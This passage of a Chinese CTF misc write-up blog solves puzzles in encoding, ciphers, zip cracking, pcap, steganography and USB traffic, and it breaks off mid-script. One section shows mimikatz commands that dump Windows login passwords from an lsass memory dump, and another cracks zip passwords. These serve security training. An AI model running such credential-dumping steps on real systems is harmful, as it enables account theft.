title="从娃娃抓起"></a>从娃娃抓起</h2><blockquote><p>题目描述：伟人的一句话，标志着一个时代的开始。那句熟悉的话，改变了许多人的一生，为中国三十年来计算机产业发展铺垫了道路。两种不同的汉字编码分别代表了汉字信息化道路上的两座伟大里程碑。请将你得到的话转为md5提交，md5统一为32位小写。</p></blockquote><p>打开txt文件，第2行应该是<code>五笔输入法</code>，第一行是 <code>中文电码</code>。</p><img src="https://s2.loli.net/2023/01/29/Gzw13utN8UdTSDf.png" alt="image-20230129211039984" style="zoom:50%;" /><p><a href="http://code.mcdvisa.com/">中文电码解密</a></p><img src="https://s2.loli.net/2023/01/29/HvoJkdmypfluQcB.png" alt="image-20230129211305496" style="zoom:33%;" /><p> <a href="http://life.chacuo.net/convertwubi">在线五笔输入</a></p><p><img src="https://s2.loli.net/2023/01/29/qFlTKoPOBA7zfjd.png" alt="image-20230129211512925"></p><p><code>人工智能也要从娃娃抓起</code></p><p>md5加密</p><p><img src="https://s2.loli.net/2023/01/29/6HhxYwsLqVcekuW.png" alt="image-20230129211647824"></p><h2 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h2><p>首先下载得到 zip压缩包 <code>222.zip</code> ，发现需要密码，但是我们不知道，我们只能使用 <code>ARCHPR</code> 爆破，获得密码，解压缩得到 <code>111.zip</code></p><p>发现是伪加密，我们可以使用工具 <code>ZipCenOp</code> 修复伪加密</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ZipCenOp.<span class="hljs-keyword">jar </span>r <span class="hljs-number">111</span>.zip<br></code></pre></td></tr></table></figure><p>打开，发现 <code>setup.sh</code> 文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br>zip -e --password=`python -c <span class="hljs-string">&quot;print(__import__(&#x27;time&#x27;).time())&quot;</span>` flag.zip flag<br></code></pre></td></tr></table></figure><p>这里使用了 时间戳当作压缩包密码进行解压，但是我们不知道时间是多少。</p><p>我们先查看一下当前的时间戳（注意是python2）：</p><img src="https://s2.loli.net/2023/01/29/Jzlp1TPLsixgrN3.png" alt="image-20230129213208408" style="zoom:50%;" /><p>我们通过文件修改日期推测 时间戳是 15…..</p><p>我们可以使用<code>掩码爆破</code> ，进行解压：</p><img src="https://s2.loli.net/2023/01/29/ZI4BUx9Kwt1dav3.png" alt="image-20230129213704650" style="zoom:50%;" /><p>获得时间戳，我们进行解压，得到flag</p><h2 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h2><p>打开txt文件：</p><p><img src="https://s2.loli.net/2023/01/29/Gl3fE1ICn9jFr4d.png" alt="image-20230129213835221"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">d<span class="hljs-number">4e8</span>e<span class="hljs-number">1</span>f<span class="hljs-number">4</span>a<span class="hljs-number">0</span>f<span class="hljs-number">7e1</span>f<span class="hljs-number">3</span>a<span class="hljs-number">0e6</span>e<span class="hljs-number">1</span>f<span class="hljs-number">3</span>f<span class="hljs-number">4</span>a<span class="hljs-number">1</span>a<span class="hljs-number">0</span>d<span class="hljs-number">4e8</span>e<span class="hljs-number">5</span>a<span class="hljs-number">0e6</span>ece<span class="hljs-number">1e7</span>a<span class="hljs-number">0e9</span>f<span class="hljs-number">3</span>baa<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">3</span>d<span class="hljs-number">4</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>fbb<span class="hljs-number">9</span>b<span class="hljs-number">2</span>b<span class="hljs-number">2e1</span>e<span class="hljs-number">2</span>b<span class="hljs-number">9</span>b<span class="hljs-number">9</span>b<span class="hljs-number">7</span>b<span class="hljs-number">4e1</span>b<span class="hljs-number">4</span>b<span class="hljs-number">7e3</span>e<span class="hljs-number">4</span>b<span class="hljs-number">3</span>b<span class="hljs-number">2</span>b<span class="hljs-number">2e3</span>e<span class="hljs-number">6</span>b<span class="hljs-number">4</span>b<span class="hljs-number">3e2</span>b<span class="hljs-number">5</span>b<span class="hljs-number">0</span>b<span class="hljs-number">6</span>b<span class="hljs-number">1</span>b<span class="hljs-number">0e6</span>e<span class="hljs-number">1e5</span>e<span class="hljs-number">1</span>b<span class="hljs-number">5</span>fd<br></code></pre></td></tr></table></figure><p>长度134的字16进制符串，每两位进行截取</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme">[<span class="hljs-symbol">&#x27;d4</span>&#x27;, <span class="hljs-symbol">&#x27;e8</span>&#x27;, <span class="hljs-symbol">&#x27;e1</span>&#x27;, <span class="hljs-symbol">&#x27;f4</span>&#x27;, <span class="hljs-symbol">&#x27;a0</span>&#x27;, <span class="hljs-symbol">&#x27;f7</span>&#x27;, <span class="hljs-symbol">&#x27;e1</span>&#x27;, <span class="hljs-symbol">&#x27;f3</span>&#x27;, <span class="hljs-symbol">&#x27;a0</span>&#x27;, <span class="hljs-symbol">&#x27;e6</span>&#x27;, <span class="hljs-symbol">&#x27;e1</span>&#x27;, <span class="hljs-symbol">&#x27;f3</span>&#x27;, <span class="hljs-symbol">&#x27;f4</span>&#x27;, <span class="hljs-symbol">&#x27;a1</span>&#x27;, <span class="hljs-symbol">&#x27;a0</span>&#x27;, <span class="hljs-symbol">&#x27;d4</span>&#x27;, <span class="hljs-symbol">&#x27;e8</span>&#x27;, <span class="hljs-symbol">&#x27;e5</span>&#x27;, <span class="hljs-symbol">&#x27;a0</span>&#x27;, <span class="hljs-symbol">&#x27;e6</span>&#x27;, <span class="hljs-symbol">&#x27;ec</span>&#x27;, <span class="hljs-symbol">&#x27;e1</span>&#x27;, <span class="hljs-symbol">&#x27;e7</span>&#x27;, <span class="hljs-symbol">&#x27;a0</span>&#x27;, <span class="hljs-symbol">&#x27;e9</span>&#x27;, <span class="hljs-symbol">&#x27;f3</span>&#x27;, <span class="hljs-symbol">&#x27;ba</span>&#x27;, <span class="hljs-symbol">&#x27;a0</span>&#x27;, <span class="hljs-symbol">&#x27;c4</span>&#x27;, <span class="hljs-symbol">&#x27;c4</span>&#x27;, <span class="hljs-symbol">&#x27;c3</span>&#x27;, <span class="hljs-symbol">&#x27;d4</span>&#x27;, <span class="hljs-symbol">&#x27;c6</span>&#x27;, <span class="hljs-symbol">&#x27;fb</span>&#x27;, <span class="hljs-symbol">&#x27;b9</span>&#x27;, <span class="hljs-symbol">&#x27;b2</span>&#x27;, <span class="hljs-symbol">&#x27;b2</span>&#x27;, <span class="hljs-symbol">&#x27;e1</span>&#x27;, <span class="hljs-symbol">&#x27;e2</span>&#x27;, <span class="hljs-symbol">&#x27;b9</span>&#x27;, <span class="hljs-symbol">&#x27;b9</span>&#x27;, <span class="hljs-symbol">&#x27;b7</span>&#x27;, <span class="hljs-symbol">&#x27;b4</span>&#x27;, <span class="hljs-symbol">&#x27;e1</span>&#x27;, <span class="hljs-symbol">&#x27;b4</span>&#x27;, <span class="hljs-symbol">&#x27;b7</span>&#x27;, <span class="hljs-symbol">&#x27;e3</span>&#x27;, <span class="hljs-symbol">&#x27;e4</span>&#x27;, <span class="hljs-symbol">&#x27;b3</span>&#x27;, <span class="hljs-symbol">&#x27;b2</span>&#x27;, <span class="hljs-symbol">&#x27;b2</span>&#x27;, <span class="hljs-symbol">&#x27;e3</span>&#x27;, <span class="hljs-symbol">&#x27;e6</span>&#x27;, <span class="hljs-symbol">&#x27;b4</span>&#x27;, <span class="hljs-symbol">&#x27;b3</span>&#x27;, <span class="hljs-symbol">&#x27;e2</span>&#x27;, <span class="hljs-symbol">&#x27;b5</span>&#x27;, <span class="hljs-symbol">&#x27;b0</span>&#x27;, <span class="hljs-symbol">&#x27;b6</span>&#x27;, <span class="hljs-symbol">&#x27;b1</span>&#x27;, <span class="hljs-symbol">&#x27;b0</span>&#x27;, <span class="hljs-symbol">&#x27;e6</span>&#x27;, <span class="hljs-symbol">&#x27;e1</span>&#x27;, <span class="hljs-symbol">&#x27;e5</span>&#x27;, <span class="hljs-symbol">&#x27;e1</span>&#x27;, <span class="hljs-symbol">&#x27;b5</span>&#x27;, <span class="hljs-symbol">&#x27;fd</span>&#x27;]<br></code></pre></td></tr></table></figure><p>转为10进制：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[212, 232, 225, 244, 160, 247, 225, 243, 160, 230, 225, 243, 244, 161, 160, 212, 232, 229, 160, 230, 236, 225, 231, 160, 233, 243, 186, 160, 196, 196, 195, 212, 198, 251, 185, 178, 178, 225, 226, 185, 185, 183, 180, 225, 180, 183, 227, 228, 179, 178, 178, 227, 230, 180, 179, 226, 181, 176, 182, 177, 176, 230, 225, 229, 225, 181, 253]</span><br></code></pre></td></tr></table></figure><p>将大于 128的数字减128得到ascii码：</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-string">[84, 104, 97, 116, 32, 119, 97, 115, 32, 102, 97, 115, 116, 33, 32, 84, 104, 101, 32, 102, 108, 97, 103, 32, 105, 115, 58, 32, 68, 68, 67, 84, 70, 123, 57, 50, 50, 97, 98, 57, 57, 55, 52, 97, 52, 55, 99, 100, 51, 50, 50, 99, 102, 52, 51, 98, 53, 48, 54, 49, 48, 102, 97, 101, 97, 53, 125]</span><br></code></pre></td></tr></table></figure><p>全部转为字符：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">That was fast! The flag <span class="hljs-keyword">is</span>: DDCTF&#123;<span class="hljs-number">922</span>ab9974a47cd322cf43b50610faea5&#125;<br></code></pre></td></tr></table></figure><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_str</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):<span class="hljs-comment">#对字符串进行切片操作，每两位截取</span><br>    hex_str_list=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)-<span class="hljs-number">1</span>,<span class="hljs-number">2</span>):<br>        hex_str=<span class="hljs-built_in">str</span>[i:i+<span class="hljs-number">2</span>]<br>        hex_str_list.append(hex_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;hex列表：%s\n&quot;</span>%hex_str_list)<br>    hex_to_str(hex_str_list)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_str</span>(<span class="hljs-params">hex_str_list</span>):<br>    int_list=[]<br>    dec_list=[]<br>    flag=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(hex_str_list)):<span class="hljs-comment">#把16进制转化为10进制</span><br>        int_str=<span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x%s&#x27;</span>%hex_str_list[i],<span class="hljs-number">16</span>)<br>        int_list.append(int_str)<br>        dec_list.append(int_str-<span class="hljs-number">128</span>)<span class="hljs-comment">#-128得到正确的ascii码</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(dec_list)):<span class="hljs-comment">#ascii码转化为字符串</span><br>        flag += <span class="hljs-built_in">chr</span>(dec_list[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;转化为十进制int列表：%s\n&quot;</span>%int_list)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-128得到ASCII十进制dec列表：%s\n&quot;</span>%dec_list)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;最终答案：%s&#x27;</span>%flag)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd&#x27;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;字符串长度：%s&quot;</span>%<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>))<br>    hex_str(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure><h2 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h2><p>下载获得一个 wav音频文件，播放一下，听起来像打电话，于是我们可以使用工具 <code>dtmf2num</code>，进行拨号音识别：</p><p><img src="https://s2.loli.net/2023/01/29/3GAEKh6SJjPiC4Y.png" alt="image-20230129215340438"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">999</span>*<span class="hljs-number">666</span>*<span class="hljs-number">88</span>*<span class="hljs-number">2</span>*<span class="hljs-number">777</span>*<span class="hljs-number">33</span>*<span class="hljs-number">6</span>*<span class="hljs-number">999</span>*<span class="hljs-number">4</span>*<span class="hljs-number">444</span>*<span class="hljs-number">777</span>*<span class="hljs-number">555</span>*<span class="hljs-number">333</span>*<span class="hljs-number">777</span>*<span class="hljs-number">444</span>*<span class="hljs-number">33</span>*<span class="hljs-number">66</span>*<span class="hljs-number">3</span>*<span class="hljs-number">7777</span><br></code></pre></td></tr></table></figure><p>看这一串数字，应该是手机键盘加密。</p><p><img src="https://s2.loli.net/2023/01/29/jaSVPu361YUyIfe.png" alt="在这里插入图片描述"></p><p><code>999</code>就是指按三下数字9得到的字母也就是<code>y</code>，以此类推，数字对应手机的每个键位，几个数字代表按几下</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-number">999</span>     <span class="hljs-comment">---&gt;   y</span><br><span class="hljs-number">666</span>     <span class="hljs-comment">---&gt;   o</span><br><span class="hljs-number">88</span>      <span class="hljs-comment">---&gt;   u</span><br><span class="hljs-number">2</span>       <span class="hljs-comment">---&gt;   a</span><br><span class="hljs-number">777</span>     <span class="hljs-comment">---&gt;   r</span><br><span class="hljs-number">33</span>      <span class="hljs-comment">---&gt;   e</span><br><span class="hljs-number">6</span>       <span class="hljs-comment">---&gt;   m</span><br><span class="hljs-number">999</span>     <span class="hljs-comment">---&gt;   y</span><br><span class="hljs-number">4</span>       <span class="hljs-comment">---&gt;   g</span><br><span class="hljs-number">4444</span>    <span class="hljs-comment">---&gt;   i</span><br><span class="hljs-number">777</span>     <span class="hljs-comment">---&gt;   r</span><br><span class="hljs-number">555</span>     <span class="hljs-comment">---&gt;   l</span><br><span class="hljs-number">333</span>     <span class="hljs-comment">---&gt;   f</span><br><span class="hljs-number">777</span>     <span class="hljs-comment">---&gt;   r</span><br><span class="hljs-number">444</span>     <span class="hljs-comment">---&gt;   i</span><br><span class="hljs-number">33</span>      <span class="hljs-comment">---&gt;   e</span><br><span class="hljs-number">66</span>      <span class="hljs-comment">---&gt;   n</span><br><span class="hljs-number">3</span>       <span class="hljs-comment">---&gt;   d</span><br><span class="hljs-number">7777</span>    <span class="hljs-comment">---&gt;   s</span><br><br>youaremygirlfriends<br></code></pre></td></tr></table></figure><h2 id="MRCTF2020-千层套路"><a href="#MRCTF2020-千层套路" class="headerlink" title="[MRCTF2020]千层套路"></a>[MRCTF2020]千层套路</h2><p>这一题是一个 zip无线套娃题</p><img src="https://s2.loli.net/2023/01/29/1Nryh7p9oKxOsba.png" alt="image-20230129215712623" style="zoom:33%;" /><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><br>filepath = <span class="hljs-string">&quot;0573.zip&quot;</span><br><br><span class="hljs-keyword">while</span> zipfile.is_zipfile(<span class="hljs-string">&quot;zip/&quot;</span> + filepath): <span class="hljs-comment"># 当文件是zip文件时</span><br>    pwd = filepath.split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>] <span class="hljs-comment">#获得解压密码</span><br>    file = zipfile.ZipFile(<span class="hljs-string">&quot;zip/&quot;</span> + filepath) <span class="hljs-comment"># 创建一个ZipFile对象，表示一个zip文件</span><br>    filepath = file.namelist().pop() <span class="hljs-comment"># namelist()获取zip文档内所有文件的名称列表</span><br>    file.extract(filepath, <span class="hljs-string">r&quot;D:\Applications\CTF\phpstudy_pro\WWW\scripts_py\BUUCTF\zip&quot;</span>, pwd=pwd.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    file.close()<br>    <span class="hljs-built_in">print</span>(filepath)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解压成功！&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h2><p>首先base64解密：</p><img src="https://s2.loli.net/2023/01/29/nHSXJRM7QWZvq5V.png" alt="image-20230129220121336" style="zoom:33%;" /><p>得到： <code>kanbbrgghjl&#123;zb____&#125;vtlaln</code> ，这个可能是<code>栅栏密码</code>。</p><p><code>注意：此处是栅栏加密，不是解密</code> <a href="http://www.hiencode.com/railfence.html">栅栏密码</a></p><img src="https://s2.loli.net/2023/01/29/BhlKkHmq6W5Yic4.png" alt="image-20230129220435582" style="zoom:33%;" /><p>每组字数为7。</p><p>然后发现应该<code>凯撒解密</code>，得到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">xman</span><span class="hljs-template-variable">&#123;oyay_now_you_get_it&#125;</span><br></code></pre></td></tr></table></figure><h2 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h2><p>下载得到一个 pcapng文件，我们使用 wireshark导出 http对象，发现一堆图片。</p><p>然后我们使用 <code>exiftool</code> 工具 ，查看所有图片的 详细信息，并且过滤出带有 { 的字段</p><p><img src="https://s2.loli.net/2023/01/29/vgzrs6y2bo9FUDB.png" alt="image-20230129221834003"></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">exiftool * | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;&#123;&#x27;</span><br></code></pre></td></tr></table></figure><p>我们得到了一半的 flag</p><p>我们我们在 wireshark 中过滤，查找字符串 <code>Exif</code>：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">tcp <span class="hljs-keyword">contains</span> <span class="hljs-string">&quot;Exif&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/01/29/8BQXLSUN6oKdh2A.png" alt="image-20230129222327838"></p><p>找到另一半flag：</p><p><img src="https://s2.loli.net/2023/01/29/ywU2EqugIQZ7aRr.png" alt="image-20230129222415741"></p><h2 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h2><p>我们使用 wireshark 导出 http对象：</p><p>一大串登录的东西</p><p><img src="https://s2.loli.net/2023/01/29/QCXj3ytWwiOz2ke.png" alt="image-20230129232915858"></p><p>我们使用 linux <code>grep</code> 命令</p><p><code>grep -r &quot;CTF&quot;</code> 查找整个目录下的字符串，得到flag</p><p><img src="https://s2.loli.net/2023/01/29/lidRkDQeEj687Jw.png" alt="image-20230129232701324"></p><h2 id="UTCTF2020-file-header"><a href="#UTCTF2020-file-header" class="headerlink" title="[UTCTF2020]file header"></a>[UTCTF2020]file header</h2><p>使用 010Editor 改一下文件头即可</p><p><img src="https://s2.loli.net/2023/01/29/CWhzHfplN1D5TRZ.png" alt="image-20230129233235714"></p><h2 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h2><p>下载后获得一个exe程序，打开：</p><img src="https://s2.loli.net/2023/01/30/FLZo3l1ujKTkYcf.png" alt="image-20230130104633584" style="zoom:33%;" /><p>提示说，只要我们时间是 <code>2020.9.17</code> 就能得到flag。</p><p>我们只需要修改计算机系统时间为 <code>2020.9.17</code> 即可</p><h2 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h2><p>首先使用 <code>foremost</code> 分离 pcap 文件，得到一个压缩包：</p><p><img src="https://s2.loli.net/2023/01/30/FYb7HC1GMt23XTf.png" alt="image-20230130114755836"></p><p>然后查看wp后，发现这个需要获取到管理员的密码去解压。</p><p>我们这里需要用到一个工具： <code>mimikatz</code></p><blockquote><p><code>mimikatz</code> 在内网渗透中是个很有用的工具。<code>mimikatz</code>可以在内存中爬取到<strong>明文密码</strong></p></blockquote><p>下载：<br> <a href="https://github.com/gentilkiwi/mimikatz/releases/">https://github.com/gentilkiwi/mimikatz/releases/</a></p><p>然后我们可以使用 wireshark 去导出 <code>lsass.dmp</code> 内存镜像</p><p><img src="https://s2.loli.net/2023/01/30/swnj6HXWrCRkh5y.png" alt="image-20230130115322693"></p><blockquote><p><strong>关于lsass</strong></p><p> <strong>lsass</strong>是windows系统的一个进程，用于本地安全和登陆策略。</p><p><code>mimikatz</code>可以从 lsass.exe 里获取windows处于<strong>active状态账号明文密码</strong>。</p></blockquote><p>本题的<code>lsass.dmp</code>就是内存运行的镜像，也可以提取到账户密码</p><p>如何使用？我们可以先将 <code>lsass.dmp</code> 复制到<code>mimikatz</code>目录下</p><p><img src="https://s2.loli.net/2023/01/30/mPu1yQUsJX4Iqir.png" alt="image-20230130115531772"></p><p>然后右键<strong>管理员运行</strong> <code>mimikatz.exe</code>：（不用会报错）</p><p><img src="https://s2.loli.net/2023/01/30/9QbhtGMnc1iljZw.png" alt="image-20230130115615175"></p><p>输入：</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-comment">//提升权限</span><br>privilege<span class="hljs-type">::debug</span><br><span class="hljs-comment">//载入dmp文件</span><br>sekurlsa<span class="hljs-type">::minidump</span> lsass.dmp<br><span class="hljs-comment">//读取登陆密码</span><br>sekurlsa<span class="hljs-type">::logonpasswords</span> <span class="hljs-literal">full</span><br></code></pre></td></tr></table></figure><p>得到：</p><p><img src="https://s2.loli.net/2023/01/30/klf5H12GsyAPza9.png" alt="image-20230130115822351"></p><p>密码： <code>W3lc0meToD0g3</code></p><p>解压zip得到flag</p><h2 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h2><p>下载后得到一个游戏源码和一张图片。</p><p>在游戏源码 <code>index.html</code> 中，我们发现了一个fake flag：</p><p><img src="https://s2.loli.net/2023/01/30/B3yQKfiEDznSmo9.png" alt="image-20230130124848144"></p><p>这是base32编码，我们解码： <code>suctf&#123;hAHaha_Fak3_F1ag&#125; </code> 一个假的flag</p><p>然后我们去分析图片：</p><img src="https://s2.loli.net/2023/01/30/GSaAxcBLdJuHDt2.png" alt="image-20230130125013103" style="zoom:33%;" /><p>我们发现了 LSB隐写：</p> <img src="https://s2.loli.net/2023/01/30/SNV5zr2qUKEMkbH.png" alt="image-20230130125055316" style="zoom:33%;" /><p>这一串看着像 base64，但是我们解码一下： <code>Salted__³4yíYRÁ|ÜTVK»¤&amp;Ñ:?)ëËÊkU</code></p><p><code>Salted</code>开头，一个是 AES、DES等编码，经过测试，发现是 <code>3DES</code> 即：<code>TripleDES</code></p><p>密钥就是：<code>suctf&#123;hAHaha_Fak3_F1ag&#125;</code>，</p><p>解密得到flag：<a href="https://www.sojson.com/encrypt_triple_des.html">https://www.sojson.com/encrypt_triple_des.html</a></p><p><img src="https://s2.loli.net/2023/01/30/zpBJjgPOyGQbLit.png" alt="image-20230130125545910"></p><h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><blockquote><p>Do your konw usb?? 注意：得到的 flag 请包上 flag{} 提交</p></blockquote><p>下载后得到一个 <code>rar压缩包</code> 和 <code>key.ftm</code> 文件</p><p><img src="https://s2.loli.net/2023/01/30/dR5XjmE8wD9sepQ.png" alt="image-20230130134615328"></p><p>使用 <code>010Editor</code> 打开 <code>key.ftm</code> ：</p><img src="https://s2.loli.net/2023/01/30/vUZHM8kNfecmSQx.png" alt="image-20230130134738445" style="zoom: 50%;" /><p>我们发现其中隐藏着 zip压缩包，我们使用 <code>foremost</code> 分离得到 流量包文件：</p><p><img src="https://s2.loli.net/2023/01/30/S8XtvyFAhOjKUNp.png" alt="image-20230130134834406"></p><p>观察可知，这是<code>USB流量包分析</code> ，这一题是 <code>USB键盘流量分析</code>.</p><blockquote><p><strong>USB流量</strong>指的是USB设备接口的流量，攻击者能够通过监听usb接口流量获取键盘敲击键、鼠标移动与点击、存储设备的铭文传输通信、USB无线网卡网络传输内容等等。在CTF中，USB流量分析主要以键盘和鼠标流量为主。</p></blockquote><blockquote><p><strong>键盘流量</strong></p><p>USB协议数据部分在Leftover Capture Data域中，数据长度为<code>八个字节</code>。其中键盘击键信息集中在第三个字节中。</p></blockquote><img src="https://s2.loli.net/2023/01/30/7R8zFoOWGvp5VaI.png" alt="image-20230130135235146" style="zoom:50%;" /><p>如图，发现击键信息为0x06，即对应的按键为<code>C</code><br>键位映射关系参考：<a href="https://wenku.baidu.com/view/9050c3c3af45b307e971971e.html">《USB键盘协议中键码》中的HID Usage ID</a></p><p>我们可以使用 linux 的 <code>tshark</code>命令 把usb流量包key.pcap中 <code>capdata</code> 读取出来：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">tshark -r key.pcap -T fields -e usb.capdata &gt; usbdata.txt<br>tshark -r key.pcap -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt <span class="hljs-comment">#提取并去除空行</span><br></code></pre></td></tr></table></figure><p>我们查看一下txt文件：</p><img src="https://s2.loli.net/2023/01/30/EBrxc6APsOGKvzl.png" alt="image-20230130135745207" style="zoom:33%;" /><p>提取出来的数据可能会带<strong>冒号</strong>，也可能不带（有可能和wireshark的版本相关），但是一般的脚本都会按照有冒号的数据来识别</p><blockquote><p>有冒号时提取数据的<code>[6:8]</code><br>无冒号时数据在<code>[4:6]</code></p></blockquote><p>可以用脚本来加上冒号：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 